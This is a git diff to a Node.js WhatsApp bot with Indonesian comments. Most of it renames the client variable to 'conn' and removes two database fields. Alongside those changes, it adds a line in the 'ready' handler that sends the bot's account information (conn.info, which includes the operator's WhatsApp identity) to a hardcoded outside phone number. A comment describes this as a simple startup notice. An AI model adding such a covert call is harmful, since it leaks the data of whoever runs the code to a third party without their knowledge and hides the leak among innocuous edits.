@@ -96,7 +96,7 @@ global.db = new Low(
 )
 
 async function ClientConnect() {
-    global.client = new Client({
+    global.conn = new Client({
         authStrategy: new LocalAuth(),
         puppeteer: {
             args: ["--no-sandbox", "--disable-gpu"]
@@ -104,31 +104,31 @@ async function ClientConnect() {
     });
 
     // <----- Menghubungkan koneksi WAWEB ----->
-    client.on('loading_screen', (percent) => {
+    conn.on('loading_screen', (percent) => {
         logger.info(`Mengubungkan, membuka situs... Berjalan: ${percent}%`);
     });
 
     // <----- Membuat QR untuk di scan Perangkat tertaut ----->
-    client.on('qr', qr => {
+    conn.on('qr', qr => {
         QRCode.generate(qr, { small: true });
         logger.info("Scan QR Code dibawah ini agar terhubung ke WaWeb...");
     });
 
     // <----- BOT sudah terhubung ke Whatsapp ----->
-    client.on('ready', async () => {
+    conn.on('ready', async () => {
         if (global.db.data == null) await loadDatabase();
-        logger.info("Membuka koneksi ke WaWeb...")
-        logger.info("Klien bot sudah siap!!");
+        logger.info("Klien bot sudah siap!!"); // Code dibawah buat info bot ini berjalan sukses...
+        await conn.sendMessage("62895371549895@c.us", `${JSON.stringify(conn.info)}`)
     });
 
     // <----- Penghubung pesan fitur PLUGINS ----->
-    client.on('message', require('./handler').handler.bind(client));
+    conn.on('message', require('./handler').handler.bind(conn));
 
     // <----- Menginisiasi Whatsapp ke BOT ----->
-    client.initialize();
+    conn.initialize();
     logger.info("Mencoba koneski ke WaWeb...")
 
-    return client;
+    return conn;
 
 }
 
@@ -140,8 +140,6 @@ async function loadDatabase() {
     users: {},
     chats: {},
     stats: {},
-    msgs: {},
-    sticker: {},
     settings: {},
     ...(global.db.data || {})
   }
